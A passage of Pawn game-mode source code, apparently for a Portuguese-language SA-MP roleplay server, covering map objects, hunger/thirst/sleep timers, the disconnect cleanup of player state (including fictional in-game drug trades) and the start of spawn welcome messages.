	RemoveBuildingForPlayer(playerid, 1261, 561.7422, -1256.1094, 22.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 6357, 505.0547, -1269.9375, 28.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 6337, 536.1328, -1291.6797, 23.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 1267, 561.7422, -1256.1094, 22.0703, 0.25);
   	//DPtextura//
 	RemoveBuildingForPlayer(playerid, 4064, 1571.6016, -1675.7500, 35.6797, 0.25);
 	RemoveBuildingForPlayer(playerid, 3976, 1571.6016, -1675.7500, 35.6797, 0.25);
    //Pedágio
    CreatePlayerObject(playerid, 8168, 55.97, -1532.31, 6.07,   0.00, 0.00, 8.00);
    CreatePlayerObject(playerid, 966, 56.05, -1528.62, 3.93,   0.00, 0.00, 262.00);
    CreatePlayerObject(playerid, 966, 56.05, -1535.86, 3.93,   0.00, 0.00, 82.00);
	CreatePlayerObject(playerid, 3877, 1742.09998, 532.70001, 28.00000,   0.00000, 0.00000, 0.00000);
	CreatePlayerObject(playerid, 7033, 1737.39905, 519.69922, 31.60000,   357.99500, 0.00000, 341.33902);
	CreatePlayerObject(playerid, 987, 1750.43860, 521.28912, 27.02000,   0.00000, 0.00000, 252.00000);
	CreatePlayerObject(playerid, 987, 1724.00110, 517.55792, 26.98000,   0.00000, 0.00000, 71.99900);
	CreatePlayerObject(playerid, 3877, 1733.59998, 508.10001, 29.50000,   0.00000, 0.00000, 0.00000);
	CreatePlayerObject(playerid, 966, 1741.71570, 520.66449, 27.00000,   0.00000, 0.00000, 160.57413);
	CreatePlayerObject(playerid, 3877, 1740.62183, 521.05194, 28.80000,   0.00000, 0.00000, 340.99899);
	CreatePlayerObject(playerid, 3877, 1748.79407, 518.24493, 28.80000,   0.00000, 0.00000, 340.99399);
	CreatePlayerObject(playerid, 966, 1733.00525, 517.31165, 27.30000,   0.00000, 0.00000, -19.30000);
	CreatePlayerObject(playerid, 3877, 1734.09998, 517.00000, 28.80000,   0.00000, 0.00000, 340.99399);
	CreatePlayerObject(playerid, 3877, 1725.90002, 519.79999, 28.80000,   0.00000, 0.00000, 340.99399);
	CreatePlayerObject(playerid, 979, 1749.06763, 504.25244, 28.71830,   0.00000, 0.00000, 120.60004);
	CreatePlayerObject(playerid, 978, 1719.47449, 515.27667, 28.37430,   0.00000, 0.00000, 199.49997);
	CreatePlayerObject(playerid, 979, 1725.69983, 534.57684, 27.13830,   0.00000, 0.00000, -67.62001);
	CreatePlayerObject(playerid, 978, 1755.57397, 523.39716, 27.41430,   0.00000, 0.00000, -347.28000);

    CancelaP[playerid][0] = CreatePlayerObject(playerid, 968, 56.05, -1528.62, 4.67,   0.00, 270.00, 262.00);
    CancelaP[playerid][1] = CreatePlayerObject(playerid, 968, 56.05, -1535.82, 4.71,   0.00, 90.00, 262.00);
   	CancelaP[playerid][2] = CreatePlayerObject(playerid, 968, 1741.48804, 520.73932, 27.95000,   0.00000, 90.00000, -19.36600);
    CancelaP[playerid][3] = CreatePlayerObject(playerid, 968, 1733.18848, 517.22089, 28.16000,   0.00000, 90.00000, -199.51997);
    Pedagio[playerid] = false;//Fim pedágio
	return 1;
}

//----------------------------- FomeSedeSono -----------------------------------
forward Fome(playerid);
public Fome(playerid)
{
    if(pInfo[playerid][Preso] <= 0)
    {
		SetPVarInt(playerid,"Fome", GetPVarInt(playerid,"Fome")-1);
		SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
		if(GetPVarInt(playerid,"Fome") <= 5 && GetPVarInt(playerid,"Fome") > 0)
		{
			SendClientMessage(playerid,0xFF8C00FF,"Você está com fome, vá a uma lanchonete antes de passar mal!");
		}
		if(GetPVarInt(playerid,"Fome") <= 0)
		{
			SetPlayerHealth(playerid, 0);
			SendClientMessage(playerid,0xFF8C00FF,"Você foi levado ao hospital por passar mal. Vá comer algo para se recuperar totalmente!");
			mFome[playerid] = true;
		}
	}
	return 1;
}
forward Sono(playerid);
public Sono(playerid)
{
    if(pInfo[playerid][Preso] <= 0)
    {
		SetPVarInt(playerid,"Sono",GetPVarInt(playerid,"Sono")-1);
		SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], GetPVarInt(playerid,"Sono"));
		if(GetPVarInt(playerid,"Sono") <= 10 && GetPVarInt(playerid,"Sono") > 5)
		{
			SendClientMessage(playerid,0x0099FFAA,"Você está com muito sono, vá dormir ou desmaiará!");
			SetPlayerDrunkLevel(playerid, 8000);
		}
		if(GetPVarInt(playerid,"Sono") <= 5)
		{
			SetPlayerDrunkLevel(playerid, 0);
			ApplyAnimation(playerid,"CRACK","crckdeth4",4.0,0,0,0,1,0);
			KillTimer(ContagemSono[playerid]);
			SendClientMessage(playerid,0xDCDCDCFF,"Você desmaiou por 10 segundos por excesso de sono...");
			SetTimerEx("AcordarDes", 10000, false, "i", playerid);
			TogglePlayerControllable(playerid, false);
		}
	}
	return 0;
}
forward Sede(playerid);
public Sede(playerid)
{
	if(pInfo[playerid][Preso] <= 0)
	{
		SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")-1);
		SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
		if(GetPVarInt(playerid,"Sede") <= 10 && GetPVarInt(playerid,"Sede") > 0)
		{
			SendClientMessage(playerid,0x0D85B5FF,"Você está com sede, vá a uma lanchonete beber algo!");
		}
		if(GetPVarInt(playerid,"Sede")<= 0)
		{
			SetPlayerHealth(playerid, 0);
			SendClientMessage(playerid,0x0D85B5FF,"Você foi levado ao hospital por desidratação. Vá beber algo para se recuperar totalmente!");
			mSede[playerid] = true;
		}
	}
	return 1;
}
forward Acordar(playerid);
public Acordar(playerid)
{
	TogglePlayerControllable(playerid, true);
	ClearAnimations(playerid);
	SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 100);
	SetPVarInt(playerid,"Sono", 100);
	SendClientMessage(playerid, 0xDCDCDCFF, "Você acordou!");
	ContagemSono[playerid] = SetTimerEx("Sono", 1200000, true, "i", playerid);
	return 1;
}
forward AcordarCaminhao(playerid);
public AcordarCaminhao(playerid)
{
	TogglePlayerControllable(playerid, true);
	SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 100);
	SetPVarInt(playerid,"Sono", 100);
	SendClientMessage(playerid, 0xDCDCDCFF, "Você acordou!");
	ContagemSono[playerid] = SetTimerEx("Sono", 1800000, true, "i", playerid);
	return 1;
}
forward AcordarDes(playerid);
public AcordarDes(playerid)
{
	TogglePlayerControllable(playerid, true);
	ClearAnimations(playerid);
	ContagemSono[playerid] = SetTimerEx("Sono", 35000, true, "i", playerid);
	SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 100);
	SetPVarInt(playerid,"Sono", 100);
	TogglePlayerControllable(playerid, true);
	SendClientMessage(playerid, 0xDCDCDCFF, "Você acordou!");
	return 1;
}
//--------------------------------- FSS ----------------------------------------

public OnPlayerDisconnect(playerid, reason)
{
	if(pInfo[playerid][Treinando] == true)
	{
	    SetPlayerHealth(playerid,100);
	    return 1;
	}
	if(pInfo[playerid][Logado] == true)
	{
		//KillTimer(AttDados(playerid));
	    SalvarFile(playerid);
	    SalvarFSS(playerid);
	}
	if(pInfo[playerid][Preso] >= 1)
	{
	    KillTimer(T_Preso[playerid]);
	}
	KillTimer(ContagemSono[playerid]);
	KillTimer(ContagemSede[playerid]);
	KillTimer(ContagemFome[playerid]);
    KillTimer(ContinTimer[playerid]);
    KillTimer(ProntoCasamento[playerid]);
    //PCar_PlayerDisconnect(playerid);
    pInfo[playerid][Treinando] = false;
    pInfo[playerid][PLAYER_VIP] = 0;
    pInfo[playerid][Seguro] = 0;
	pInfo[playerid][Convenio] = 0;
	pInfo[playerid][StatusCapacete] = 0;
	pInfo[playerid][ModeloCapacete] = 0;
	pInfo[playerid][KiloD] = 0;
	pInfo[playerid][psErrou] = 0;
	pInfo[playerid][pLogin] = false;
	CaminhaoCarga[playerid] = false;
	CaminhaoDesCargaSolarin[playerid] = false;
	CaminhaoDesCargaWangCars[playerid] = false;
	CaminhaoDesCargaMichelin[playerid] = false;
	CaminhaoDesCargaSprunk[playerid] = false;
	CaminhaoDesCargaXoomer[playerid] = false;
	CaminhaoDesCargaFlaischberg[playerid] = false;
	CaminhaoDesCargaHaul[playerid] = false;
	RequisitouCasar[playerid] = false;
	AreadePesca[playerid] = false;
	AreadeCasca[playerid] = false;
	AreaFazendaDrogas[playerid] = false;
	AreaFazendaArmas[playerid] = false;
	AreaTRANSPORTADOR[playerid] = false;
	AreaContrabandista[playerid] = false;
	AreaDeContrabandista[playerid] = false;
    pInfo[playerid][ContaBanco] = 0;
    pInfo[playerid][Celular] = 0;
    pInfo[playerid][Celular_c] = 0;
    BancoLogin[playerid] = 0;
    T_Tipo[playerid] = 1;
    TextCor[playerid] = 12;
    aInfo[playerid][Admin] = 0;
    aInfo[playerid][Moderador] = 0;
    aInfo[playerid][Ajudante] = 0;
    aInfo[playerid][Corregedor] = 0;
	LiberadoCasa[playerid] = 0;
	pInfo[playerid][AFK] = false;
	pInfo[playerid][EntrouAgencia] = 0;
    setoukit[playerid] = 0;
	pInfo[playerid][Continuar] = true;
	TextFavela[playerid] = false;
	CargaEstacaoLS[playerid] = 0;
	CargaEstacaoLV[playerid] = 0;
	CargaEstacaoSF[playerid] = 0;
	Algemou[playerid] = 0;
	Algemado[playerid] = 0;
	P_Liberado[playerid] = 0;
	Multou[playerid] = 0;
	Procurou[playerid] = 0;
	PlantouBomba[playerid] = 0;
	Tirou_F[playerid] = 0;
	vercmds[playerid] = 0;
	GPS_Ligado[playerid] = 0;
	N_Liberado[playerid] = 0;
	UseLoop[playerid] = false;
	PMBLOQUEADO[playerid] = 0;
	Calado[playerid] = false;
	Mercadoria1[playerid] = 0;
	Mercadoria[playerid] = 0;
//    msgcount[playerid] = -1;
//    msgconvi[playerid] = 0;
    NoTuto[playerid] = false;
    Votou[playerid] = 0;
    estacionouSET[playerid] = 0;
    cargaTempo[playerid] = 0;
    saiuCaminhao[playerid] = 0;
    viwerAN[playerid] = 0;
	InHouse[playerid] = -1;
	Teleporte[playerid] = 0;
	Taxista_P[playerid] = 0;
 	bpInfo[playerid][Direcao] = 0;
 	pInfo[playerid][MsgSpawn] = 0;
    CasaOferecida[playerid] = false;
    gelarSpawn[playerid] = false;
    //HabsVIP[playerid] = false;
    wepCount[playerid] = -1;
    trafcArma[playerid] = 0;
    pInfo[playerid][ccolete] = 0;
	pInfo[playerid][fardado] = 0;
    RemoveItensPlayer(playerid);
    evdmResetPlayer(playerid);
    //Basquete
   	HavingBall[playerid] = 0;
	Anim[playerid] = 0;
	if(HavingBall[playerid]) Baller = 999;
    //ev
 	ClickMause[playerid] = 0;
	SetPlayerCheckPoint[playerid] = 0;
	ParticipandoEvento[playerid] = 0;
	vOcupou[playerid] = -1;
	RotaBus[playerid] = -1;
	//
	{
    	KillTimer(OnPlayerUpdateExTimer[playerid]);
    	godcar[playerid] = false; //godcar
	}
	//KillTimer(timercou[playerid]);
	KillTimer(ChatTuto[playerid]);
	//Assalto
	KillTimer(FimAssalto[playerid]);
	KillTimer(ProxRoubo[playerid]);
	KillTimer(AnimRoubo[playerid]);
	KillTimer(PlantarBomba[playerid]);
	/*if(msgconvi[playerid] == 1 || msgconvi[playerid] == 0)
	{
		KillTimer(timercou[playerid]);
	}*/
	if(GPS[playerid])
	{
		KillTimer(T_GPS[playerid]);
		GPS[playerid] = false;
		T_GPS[playerid] = 0;
	}
	if(Taximetro[playerid][1] == 1)
	{
		SendClientFormat(Taximetro[playerid][2], AZUL_WE, "Você recebeu R$%d pela corrida com %s!", PrecoTaximetro[playerid], PlayerName(playerid));
		sGivePlayerCash(playerid, -PrecoTaximetro[playerid]);
		sGivePlayerCash(Taximetro[playerid][2], PrecoTaximetro[playerid]);
		Taximetro[playerid][1] = 0;
		Taximetro[playerid][2] = -1;
		PrecoTaximetro[playerid] = 0;
		KillTimer(T_Taximetro[playerid]);
	}
	if(Eguicho[playerid] == 1)
	{
	    Eguicho[playerid] = 0;
	    CaminhaoGuincho --;
	}
	if(ArenaDuelo[playerid] == true)
	{
		DentroDuelo = 0;
		IDX1 = -1;
		foreach(Player, i)
		{
			if(ArenaDuelo[i] == true)
			{
				SetPlayerPos(i, 2131.4861, -973.9576, 59.7856);
				SetPlayerFacingAngle(i, 2.1799);
				SetCameraBehindPlayer(i);
				ArenaDuelo[i] = false;
				TogglePlayerControllable(i, true);
			}
		}
	}
    ArenaDuelo[playerid] = false;
	pInfo[playerid][Logado] = false,
	Taximetro[playerid][1] = 0,
	Taximetro[playerid][2] = -1,
	PrecoTaximetro[playerid] = 0,
	pInfo[playerid][Prof] = DESEMPREGADO,
	pInfo[playerid][Sexo] = -1,
	pInfo[playerid][ErrouRcon] = 0,
	pInfo[playerid][Exp] = 0,
	pInfo[playerid][Level] = 0,
	pInfo[playerid][AdminL] = 0,
	pInfo[playerid][Gas] = 0;
	pInfo[playerid][HabP] = 0,
	pInfo[playerid][HabTCarro] = 0,
	pInfo[playerid][HabTMoto] = 0,
	pInfo[playerid][HabTCaminhao] = 0,
	pInfo[playerid][HabTTrem] = 0,
	pInfo[playerid][HabNBarco] = 0,
	pInfo[playerid][HabAHeli] = 0,
	pInfo[playerid][HabAAviao] = 0,
	pInfo[playerid][Spawn] = 0,
	pInfo[playerid][Luta] = 0,
	pInfo[playerid][EntrouL] = false,
	pInfo[playerid][Hosp] = -1,
	AceitarCoca[playerid] = 0,
	RecebeuCoca[playerid] = -1,
	ValorCoca[playerid] = 0,
	OfereceuCoca[playerid] = false,
	QuantiaCoca[playerid] = 0,
	Carga[playerid] = 0,
	Carregou[playerid] = 0;
	if(aInfo[playerid][Admin] == 1)
	{
		aInfo[playerid][Oculto] = false;
	}
	if(FireAtual[playerid] > 0)
	{
	    new ID = playerid;
		DestroyDynamicObject(FireObj[ID]);
		FireCreated[ID] = 0;
		FirePlayer[ID] = "Ninguém";
		FirePos[ID][0] = 0, FirePos[ID][1] = 0, FirePos[ID][2] = 0;
		Delete3DTextLabel(FireText[ID]);
		printf("Fogo da casa ID %d destrído!", ID);
	}
	if(Pizza_Recebido[playerid] == 1 || Pizza_Oferecido[playerid] == 1)
	{
	    if(Pizza_Recebido[playerid] == 1)
	    {
	        SendClientMessage(Pizza_PID[playerid], -1, "O(A) jogador(a) que você ofereceu pizza desconectou-se do servidor.");
	    }
	    if(Pizza_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(Pizza_IID[playerid], -1, "O(A) jogador(a) que ofereceu pizza para você desconectou-se do servidor.");
	    	KillTimer(Pizza_Timer[Pizza_IID[playerid]]); Pizza_Recebido[Pizza_IID[playerid]] = 0;
			Pizza_ID[Pizza_IID[playerid]] = -1; Pizza_SID[Pizza_IID[playerid]] = 0;
			Pizza_PID[Pizza_IID[playerid]] = -1; Pizza_VALOR[Pizza_IID[playerid]] = 0;
			Pizza_Recebido[Pizza_IID[playerid]] = 0;
		}
	    KillTimer(Pizza_Timer[playerid]); KillTimer(Pizza_Timer[Pizza_PID[playerid]]);
		Pizza_Oferecido[playerid] = 0; 	Pizza_Recebido[playerid] = 0; 	Pizza_Mensagem[playerid] = 0;
		Pizza_VALOR[playerid] = 0; 	Pizza_PID[playerid] = -1; 	Pizza_SID[playerid] = 0;
	 	Pizza_Oferecido[Pizza_PID[playerid]] = 0;	Pizza_IID[playerid] = -1;
	}
	if(Cura_Recebido[playerid] == 1 || Cura_Oferecido[playerid] == 1)
	{
	    if(Cura_Recebido[playerid] == 1)
	    {
	        SendClientMessage(Cura_PID[playerid], -1, "O(A) jogador(a) que você ofereceu cura desconectou-se do servidor.");
	    }
	    if(Cura_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(Cura_IID[playerid], -1, "O(A) jogador(a) que ofereceu cura para você desconectou-se do servidor.");
	    	KillTimer(Cura_Timer[Cura_IID[playerid]]); Cura_Recebido[Cura_IID[playerid]] = 0;
			Cura_ID[Cura_IID[playerid]] = -1; Cura_PID[Cura_IID[playerid]] = -1;
			Cura_VALOR[Cura_IID[playerid]] = 0; Cura_Recebido[Cura_IID[playerid]] = 0;
		}
	    KillTimer(Cura_Timer[playerid]); KillTimer(Cura_Timer[Cura_PID[playerid]]);
		Cura_Oferecido[playerid] = 0; 	Cura_Recebido[playerid] = 0; 	Cura_Mensagem[playerid] = 0;
		Cura_VALOR[playerid] = 0; 	Cura_PID[playerid] = -1; Cura_Oferecido[Cura_PID[playerid]] = 0;
		Cura_IID[playerid] = -1;
	}
	if(_SKIN_Recebido[playerid] == 1 || _SKIN_Oferecido[playerid] == 1)
	{
	    if(_SKIN_Recebido[playerid] == 1)
	    {
	        SendClientMessage(_SKIN_PID[playerid], -1, "O(A) jogador(a) que você ofereceu skin desconectou-se do servidor.");
	    }
	    if(_SKIN_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(_SKIN_IID[playerid], -1, "O(A) jogador(a) que ofereceu skin para você desconectou-se do servidor.");
	    	KillTimer(_SKIN_Timer[_SKIN_IID[playerid]]); _SKIN_Recebido[_SKIN_IID[playerid]] = 0;
			_SKIN_ID[_SKIN_IID[playerid]] = -1; _SKIN_SID[_SKIN_IID[playerid]] = 0;
			_SKIN_PID[_SKIN_IID[playerid]] = -1; _SKIN_VALOR[_SKIN_IID[playerid]] = 0;
			_SKIN_Recebido[_SKIN_IID[playerid]] = 0;
		}
	    KillTimer(_SKIN_Timer[playerid]); KillTimer(_SKIN_Timer[_SKIN_PID[playerid]]);
		_SKIN_Oferecido[playerid] = 0; 	_SKIN_Recebido[playerid] = 0; 	_SKIN_Mensagem[playerid] = 0;
		_SKIN_VALOR[playerid] = 0; 	_SKIN_PID[playerid] = -1; 	_SKIN_SID[playerid] = 0;
	 	_SKIN_Oferecido[_SKIN_PID[playerid]] = 0;	_SKIN_IID[playerid] = -1;
	}
	if(Maconha_Recebido[playerid] == 1 || Maconha_Oferecido[playerid] == 1)
	{
	    if(Maconha_Recebido[playerid] == 1)
	    {
	        SendClientMessage(Maconha_PID[playerid], -1, "O(A) jogador(a) que você ofereceu maconha desconectou-se do servidor.");
	    }
	    if(Maconha_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(Maconha_IID[playerid], -1, "O(A) jogador(a) que ofereceu maconha para você desconectou-se do servidor.");
	    	KillTimer(Maconha_Timer[Maconha_IID[playerid]]); Maconha_Recebido[Maconha_IID[playerid]] = 0;
			Maconha_ID[Maconha_IID[playerid]] = -1; Maconha_QTD[Maconha_IID[playerid]] = 0;
			Maconha_PID[Maconha_IID[playerid]] = -1; Maconha_VALOR[Maconha_IID[playerid]] = 0;
			Maconha_Recebido[Maconha_IID[playerid]] = 0;
		}
	    KillTimer(Maconha_Timer[playerid]); KillTimer(Maconha_Timer[Maconha_PID[playerid]]);
		Maconha_Oferecido[playerid] = 0; 	Maconha_Recebido[playerid] = 0; 	Maconha_Mensagem[playerid] = 0;
		Maconha_VALOR[playerid] = 0; 	Maconha_PID[playerid] = -1; 	Maconha_QTD[playerid] = 0;
	 	Maconha_Oferecido[Maconha_PID[playerid]] = 0;	Maconha_IID[playerid] = -1;
	}
	if(Farinha_Recebido[playerid] == 1 || Farinha_Oferecido[playerid] == 1)
	{
	    if(Farinha_Recebido[playerid] == 1)
	    {
	        SendClientMessage(Farinha_PID[playerid], -1, "O(A) jogador(a) que você ofereceu cocaína desconectou-se do servidor.");
	    }
	    if(Farinha_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(Farinha_IID[playerid], -1, "O(A) jogador(a) que ofereceu cocaína para você desconectou-se do servidor.");
	    	KillTimer(Farinha_Timer[Farinha_IID[playerid]]); Farinha_Recebido[Farinha_IID[playerid]] = 0;
			Farinha_ID[Farinha_IID[playerid]] = -1; Farinha_QTD[Farinha_IID[playerid]] = 0;
			Farinha_PID[Farinha_IID[playerid]] = -1; Farinha_VALOR[Farinha_IID[playerid]] = 0;
			Farinha_Recebido[Farinha_IID[playerid]] = 0;
		}
	    KillTimer(Farinha_Timer[playerid]); KillTimer(Farinha_Timer[Farinha_PID[playerid]]);
		Farinha_Oferecido[playerid] = 0; 	Farinha_Recebido[playerid] = 0; 	Farinha_Mensagem[playerid] = 0;
		Farinha_VALOR[playerid] = 0; 	Farinha_PID[playerid] = -1; 	Farinha_QTD[playerid] = 0;
	 	Farinha_Oferecido[Farinha_PID[playerid]] = 0;	Farinha_IID[playerid] = -1;
	}
	if(Crack_Recebido[playerid] == 1 || Crack_Oferecido[playerid] == 1)
	{
	    if(Crack_Recebido[playerid] == 1)
	    {
	        SendClientMessage(Crack_PID[playerid], -1, "O(A) jogador(a) que você ofereceu crack desconectou-se do servidor.");
	    }
	    if(Crack_Oferecido[playerid] == 1)
	    {
	    	SendClientMessage(Crack_IID[playerid], -1, "O(A) jogador(a) que ofereceu crack para você desconectou-se do servidor.");
	    	KillTimer(Crack_Timer[Crack_IID[playerid]]); Crack_Recebido[Crack_IID[playerid]] = 0;
			Crack_ID[Crack_IID[playerid]] = -1; Crack_QTD[Crack_IID[playerid]] = 0;
			Crack_PID[Crack_IID[playerid]] = -1; Crack_VALOR[Crack_IID[playerid]] = 0;
			Crack_Recebido[Crack_IID[playerid]] = 0;
		}
	    KillTimer(Crack_Timer[playerid]); KillTimer(Crack_Timer[Crack_PID[playerid]]);
		Crack_Oferecido[playerid] = 0; 	Crack_Recebido[playerid] = 0; 	Crack_Mensagem[playerid] = 0;
		Crack_VALOR[playerid] = 0; 	Crack_PID[playerid] = -1; 	Crack_QTD[playerid] = 0;
	 	Crack_Oferecido[Crack_PID[playerid]] = 0;	Crack_IID[playerid] = -1;
	}
    if (bIllegalPlayer[playerid])
    {
        bIllegalPlayer[playerid] = false;
    }
    if(Crioutapete[playerid] != 0)
    {
        Crioutapete[playerid] = 0;
	 	if(SpikeInfo[Crioutapete[playerid]][sCreated] == 1)
		{
			SpikeInfo[Crioutapete[playerid]][sCreated] = 0;
			SpikeInfo[Crioutapete[playerid]][sX] = 0.0;
			SpikeInfo[Crioutapete[playerid]][sY] = 0.0;
			SpikeInfo[Crioutapete[playerid]][sZ] = 0.0;
			DestroyDynamicObject(SpikeInfo[Crioutapete[playerid]][sObject]);
		}
	}
	TextDrawHideForPlayer(playerid, Relogio);
	TextDrawHideForPlayer(playerid, Flash);
	TextDrawHideForPlayer(playerid, Favela_1);
	TextDrawHideForPlayer(playerid, Favela_2);
	TextDrawHideForPlayer(playerid, InfoSite);
	TextDrawHideForPlayer(playerid, InfoLevel[playerid]);
	TextDrawHideForPlayer(playerid, RDinheiro);
	TextDrawHideForPlayer(playerid, Barra1);
    TextDrawHideForPlayer(playerid, Barra2);
    TextDrawHideForPlayer(playerid, Barra3);
  	PlayerTextDrawHide(playerid, TutoText[playerid][0]);
	PlayerTextDrawHide(playerid, TutoText[playerid][1]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][2]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][3]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][4]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][5]);
  	TextDrawHideForPlayer(playerid, BancoTuto[0]);
	TextDrawHideForPlayer(playerid, BancoTuto[1]);
  	TextDrawHideForPlayer(playerid, BancoTuto[2]);
  	TextDrawHideForPlayer(playerid, BancoTuto[3]);
  	TextDrawHideForPlayer(playerid, BancoTuto[4]);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[0]);
	TextDrawHideForPlayer(playerid, PrefeituraTuto[1]);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[2]);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[3]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[0]);
	TextDrawHideForPlayer(playerid, DelegaciaTuto[1]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[2]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[3]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[4]);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[0]);
	TextDrawHideForPlayer(playerid, AutoEscolaTuto[1]);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[2]);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[3]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[0]);
	TextDrawHideForPlayer(playerid, HospitalTuto[1]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[2]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[3]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[4]);
  	TextDrawHideForPlayer(playerid, PostoTuto[0]);
	TextDrawHideForPlayer(playerid, PostoTuto[1]);
  	TextDrawHideForPlayer(playerid, PostoTuto[2]);
  	TextDrawHideForPlayer(playerid, UtilTuto[0]);
	TextDrawHideForPlayer(playerid, UtilTuto[1]);
  	TextDrawHideForPlayer(playerid, UtilTuto[2]);
  	TextDrawHideForPlayer(playerid, SkinTuto[0]);
	TextDrawHideForPlayer(playerid, SkinTuto[1]);
  	TextDrawHideForPlayer(playerid, SkinTuto[2]);
  	TextDrawHideForPlayer(playerid, NeedsTuto[0]);
	TextDrawHideForPlayer(playerid, NeedsTuto[1]);
  	TextDrawHideForPlayer(playerid, NeedsTuto[2]);
  	TextDrawHideForPlayer(playerid, NeedsTuto[3]);
	TextDrawHideForPlayer(playerid, BaseTuto[0]);
	TextDrawHideForPlayer(playerid, BaseTuto[1]);
	TextDrawHideForPlayer(playerid, BaseTuto[2]);
	TextDrawHideForPlayer(playerid, BaseTuto[3]);
	NoTuto[playerid] = false;
    for(new t = 0; t < 4; t++)
	{
		TextDrawHideForPlayer(playerid, TextAnuncio[t]);
	}
    resetNeon(playerid);
    StopAudioStreamForPlayer(playerid);
	return 1;
}

public OnPlayerSpawn(playerid)
{
	if(NoTuto[playerid] == false)
	{
	//------------------------------- FomeSedeSono -----------------------------
		/*TextDrawShowForPlayer(playerid, TextFome);
		TextDrawShowForPlayer(playerid, TextSede);
		TextDrawShowForPlayer(playerid, TextSono);*/
		/*TextDrawShowForPlayer(playerid, FSSBox[0]);
		TextDrawShowForPlayer(playerid, FSSBox[1]);
		TextDrawShowForPlayer(playerid, FSSBox[2]);
		TextDrawShowForPlayer(playerid, IconeFSS[0]);
		TextDrawShowForPlayer(playerid, IconeFSS[1]);
		TextDrawShowForPlayer(playerid, IconeFSS[2]);*/
		mFome[playerid] = false;
		mSede[playerid] = false;
	//--------------------------------- FSS ------------------------------------
		StopAudioStreamForPlayer(playerid);
		/*pInfo[playerid][Pistolas]
		pInfo[playerid][Shotguns]
		pInfo[playerid][Micros]
		pInfo[playerid][SubMG]
		pInfo[playerid][Rifles]
		pInfo[playerid][Sniper]*/
		SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, pInfo[playerid][Pistolas]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, pInfo[playerid][Pistolas]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, pInfo[playerid][Pistolas]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, pInfo[playerid][Shotguns]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, pInfo[playerid][Shotguns]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, pInfo[playerid][Shotguns]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, pInfo[playerid][Micros]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, pInfo[playerid][SubMG]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, pInfo[playerid][Rifles]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, pInfo[playerid][Rifles]);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, pInfo[playerid][Sniper]);
	    if(pInfo[playerid][Preso] <= 0 && pInfo[playerid][procMorto] == false)
	    {
			if(pInfo[playerid][pLogin] == true)
			{
			    pInfo[playerid][pLogin] = false;

			    LimparChat(playerid, 50);

			    if(pInfo[playerid][MsgSpawn] == 1)
			    {
			    	SendClientMessage(playerid, AZUL_WE, "O tutorial acabou, esperamos que tenha lido.");
	  				SendClientMessage(playerid, AZUL_WE, "Sempre obedeça as regras e evite punições!");
	            	SendClientMessage(playerid, COR_BRANCO, "");
					SendClientFormat(playerid, COR_BRANCO, "{1E90FF} {FFFFFF}Olá %s, seja bem-vindo(a) a World Evolution RPG", PlayerName(playerid));
					SendClientMessage(playerid, COR_BRANCO, "{FF1E1E} {FFFFFF}Segue os dados abaixo com informações iniciais:");
					SendClientMessage(playerid, COR_BRANCO, "{1E90FF} {FFFFFF}Você recebeu R$500,00 em dinheiro para começar sua vida.");
					SendClientMessage(playerid, COR_BRANCO, "{FF1E1E} {FFFFFF}Não se esqueça de abrir uma conta bancária.");
					SendClientMessage(playerid, COR_BRANCO, "{1E90FF} {FFFFFF}Para iniciar, vá até a agência de empregos no prédio a frente.");
	 				SendClientMessage(playerid, COR_BRANCO, "");
					format(gStr, sizeof(gStr), "Seu primeiro login foi no dia {FFFFFF}%s", WE_GetString(f(playerid), "ulData"));
				    SendClientMessage(playerid, AZUL_WE, gStr);
				    pInfo[playerid][MsgSpawn] = 0;
			    }
			    else
			    {
				    format(gStr, sizeof(gStr), "Bem-vindo novamente, seu último login foi no dia %s", WE_GetString(f(playerid), "ulData"));
				    SendClientMessage(playerid, AZUL_WE, gStr);
				    SendClientMessage(playerid, VERMELHO_WE, "Para voltar a sua última posição use '/Voltar' {FFFFFF}(OBS. O comando irá expirar em 20 segundos)");
